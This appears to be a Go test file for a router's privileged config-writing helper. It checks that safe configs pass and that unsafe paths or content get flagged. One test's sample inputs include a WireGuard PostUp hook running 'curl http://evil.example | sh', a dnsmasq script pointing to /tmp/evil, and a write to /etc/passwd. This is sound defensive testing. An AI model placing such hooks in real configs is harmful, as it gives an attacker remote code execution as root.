// captureLog returns what the standard logger prints while f runs.
func captureLog(f func()) string {
	var buf bytes.Buffer
	old := log.Writer()
	log.SetOutput(&buf)
	defer log.SetOutput(old)
	f()
	return buf.String()
}

func TestShadowCheckStaysQuietForGoodContent(t *testing.T) {
	out := captureLog(func() {
		shadowCheckManagedWrite("/etc/wireguard/wg0.conf", []byte(wireGuardBaseConf("K=")))
		shadowCheckManagedWrite("/etc/dnsmasq.d/softrouter-dhcp.conf", []byte("interface=br0\ndhcp-range=br0,192.168.3.50,192.168.3.150,12h\n"))
	})
	if strings.Contains(out, "PRIVHELPER-SHADOW") {
		t.Errorf("good content must not be flagged:\n%s", out)
	}
}

func TestShadowCheckFlagsWhatTheHelperWouldRefuse(t *testing.T) {
	out := captureLog(func() {
		shadowCheckManagedWrite("/etc/passwd", []byte("x"))
		shadowCheckManagedWrite("/etc/wireguard/wg0.conf", []byte("[Interface]\nPostUp = curl http://evil.example | sh\n"))
		shadowCheckManagedWrite("/etc/dnsmasq.d/softrouter-dhcp.conf", []byte("dhcp-script=/tmp/evil\n"))
	})
	for _, want := range []string{"refuse to write /etc/passwd", "refuse this content for /etc/wireguard/wg0.conf", "refuse this content for /etc/dnsmasq.d/softrouter-dhcp.conf"} {
		if !strings.Contains(out, want) {
			t.Errorf("expected a shadow warning containing %q, got:\n%s", want, out)
		}
	}
}

func TestWriteRootConfigStillWritesWhileRoot(t *testing.T) {
	if os.Getuid() != 0 {
		t.Skip("shadow mode only applies while the backend runs as root")
	}
	dir := t.TempDir()
	path := filepath.Join(dir, "x.conf") // not a managed path: the helper would refuse it
	var err error
	out := captureLog(func() { err = writeRootConfig(path, []byte("hello"), 0600) })
	if err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(path); string(b) != "hello" {
		t.Errorf("file not written: %q", b)
	}
	if !strings.Contains(out, "PRIVHELPER-SHADOW") {
		t.Error("an unmanaged path should be flagged in shadow mode")
	}
	if err := writeRootConfigAtomic(path, []byte("again"), 0600); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(path); string(b) != "again" {
		t.Errorf("atomic write failed: %q", b)
	}
}

// The helper's policy must accept what the backend really generates, or moving the writes
// behind the helper would break the feature. Real generators are used where they are
// separate functions; the rest use the exact formats the handlers write.
func TestHelperPolicyAcceptsGeneratedConfigs(t *testing.T) {
	fm := &FirewallManager{}
	rs, err := fm.generateFullRulesetGuest([]string{"eth0"}, []string{"br0", "wg0"}, []string{"eth1.20"},
		[]GuestAllowRule{{Name: "Jellyfin", Destination: "192.168.3.102", Ports: []int{443}, Enabled: true}}, testCfg(nil), nil)
	if err != nil {
		t.Fatal(err)
	}
	frr := buildFRRConfigString(DynamicRoutingConfig{
		OSPF: OSPFConfig{Enabled: true, RouterID: "192.168.3.1", Redistribute: []string{"connected"}, Networks: []OSPFNet{{Network: "192.168.3.0/24", Area: "0"}}},
		BGP:  BGPConfig{Enabled: true, ASN: 65001, RouterID: "192.168.3.1", Networks: []string{"192.168.3.0/24"}, Neighbors: []BGPNeighbor{{IP: "192.168.3.2", RemoteASN: 65002}}},
	})

	cases := []struct{ path, content string }{
		{"/etc/nftables.conf", rs},
		{"/etc/frr/frr.conf", frr},
		{"/etc/wireguard/wg0.conf", wireGuardBaseConf("K=") + "\n# phone\n[Peer]\nPublicKey = P=\nAllowedIPs = 10.8.0.2/32\n"},
		{"/etc/systemd/system/suricata.service.d/override.conf", suricataIPSOverride},
		{"/etc/suricata/modify.conf", "re:\"malware\" => drop\nre:\"trojan|exploit\" => drop"},
		{"/etc/dnsmasq.d/adguard-compat.conf", "# Configured by SoftRouter: DHCP-only mode (AdGuard Home handles port 53 DNS)\nport=0\n"},
		{"/etc/dnsmasq.d/softrouter-dhcp.conf", "# Auto-generated by SoftRouter - DO NOT EDIT MANUALLY\n\n# DHCPv4 for eno1.20\ninterface=eno1.20\ndhcp-range=eno1.20,192.168.20.2,192.168.20.90,12h\ndhcp-option=eno1.20,3,192.168.20.1\ndhcp-option=eno1.20,6,192.168.20.1\n\n# DHCPv6 for br0\nenable-ra\ndhcp-range=::100,::1ff,constructor:br0,12h\ndhcp-option=option6:dns-server,[fd00::1]\n\n# Static Reservations\ndhcp-host=aa:bb:cc:dd:ee:ff,192.168.3.10,printer\n"},
		{"/etc/radvd.conf", "# Generated by SoftRouter - DO NOT EDIT MANUALLY\n\ninterface br0 {\n    AdvSendAdvert on;\n    MinRtrAdvInterval 3;\n    MaxRtrAdvInterval 10;\n    AdvManagedFlag off;\n    AdvOtherConfigFlag off;\n\n    prefix fd00:1::/64 {\n        AdvOnLink on;\n        AdvAutonomous on;\n        AdvRouterAddr on;\n    };\n\n    RDNSS fd00:1::1 2606:4700:4700::1111 {\n    };\n};\n"},
		{"/etc/miniupnpd/miniupnpd.conf", "ext_ifname=enp3s0f1\nlisten_ip=br0\nenable_upnp=yes\nenable_natpmp=yes\nsecure_mode=yes\nsystem_uptime=yes\n\nallow 1024-65535 192.168.0.0/16 1024-65535\ndeny 0-65535 0.0.0.0/0 0-65535\n"},
		{"/etc/openvpn/server/server.conf", "\nport 1194\nproto udp\ndev tun\nca ca.crt\ncert server.crt\nkey server.key\ndh dh.pem\nauth SHA256\ntls-crypt ta.key\ntopology subnet\nserver 10.9.0.0 255.255.255.0\nifconfig-pool-persist ipp.txt\npush \"redirect-gateway def1 bypass-dhcp\"\npush \"dhcp-option DNS 1.1.1.1\"\nkeepalive 10 120\ncipher AES-256-GCM\nuser nobody\ngroup nogroup\npersist-key\npersist-tun\nstatus openvpn-status.log\nverb 3\nexplicit-exit-notify 1\n"},
	}
	for _, c := range cases {
		if err := validateManagedPath(c.path, false); err != nil {
			t.Errorf("%s: path refused: %v", c.path, err)
			continue
		}
		if err := validateManagedContent(c.path, []byte(c.content)); err != nil {
			t.Errorf("%s: content refused: %v", c.path, err)
		}
	}
	// Other destinations the backend writes to.
	for _, p := range []string{"/etc/openvpn/client/pia.auth", "/etc/openvpn/client/pia.conf", "/etc/nftables.conf.backup"} {
		if err := validateManagedPath(p, false); err != nil {
			t.Errorf("%s: path refused: %v", p, err)
		}
	}
}

// Root-interpreted configs must go through writeRootConfig so the helper can enforce policy
// on them. This fails if someone writes one of them directly again.
func TestRootConfigsAreNotWrittenDirectly(t *testing.T) {
	protected := []string{
		"wgConfPath", "dnsmasqDHCPPath", "adguardCompatFile", "frrConfigPath", "nftablesConfPath",
		"radvdConfigPath", "vpnAuthFile", "vpnConfigFile", "modifyConfPath", "overrideFile", "miniupnpdConf",
		`filepath.Join(ovpnServerDir, "server.conf")`, "confPath",
	}
	files, _ := filepath.Glob("*.go")
	for _, f := range files {
		if strings.HasSuffix(f, "_test.go") || f == "priv_config.go" || strings.HasPrefix(f, "privhelper") {
			continue
		}
		src, _ := os.ReadFile(f)
		text := string(src)
		for _, name := range protected {
			for _, fn := range []string{"os.WriteFile(", "writeFileAtomic("} {
				if name == "confPath" && f != "main.go" {
					continue // generic name; only main.go uses it for wg0.conf
				}
				if strings.Contains(text, fn+name+",") {
					t.Errorf("%s writes %s directly with %s; use writeRootConfig", f, name, fn)
				}
			}
		}
	}
}
